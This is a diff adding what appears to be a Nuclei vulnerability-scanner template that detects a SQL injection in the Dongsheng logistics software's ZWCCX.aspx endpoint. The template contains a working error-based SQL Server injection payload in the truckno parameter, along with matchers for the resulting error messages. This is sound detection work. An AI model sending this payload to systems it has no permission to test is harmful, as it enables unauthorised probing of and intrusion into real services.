@@ -1,0 +1,37 @@
+id: dongshengsoft-zwccx-aspx-sqli
+info:
+  name: 东胜物流软件 ZWCCX.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in 东胜物流软件 on the ZWCCX.aspx endpoint.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /Areas/Mobile/Views/WMS/ZWCCX.aspx?truckno='and+1<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "SqlException"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+        part: body
+      - type: regex
+        regex:
+          - "在将(.*?)值"
+        part: body
